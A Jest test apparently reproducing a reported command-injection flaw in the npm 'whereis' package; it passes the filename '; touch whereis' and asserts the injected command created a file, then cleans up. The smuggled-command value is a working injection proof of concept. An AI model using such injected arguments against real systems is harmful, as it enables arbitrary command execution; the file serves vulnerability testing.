//https://hackerone.com/reports/319476
test("Command Injection in whereis", () => {
  const whereis = require("whereis");
  const fs = require("fs");
  const path = "./whereis";
  const sleep = require("sleep");

  try {
    fs.unlinkSync(path);
    console.log("File removed:", path);
  } catch (err) {
    console.error(err);
  }

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  let filename = "; touch whereis";
  whereis(filename, function (err, path) {
    //console.log(path);
  });

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
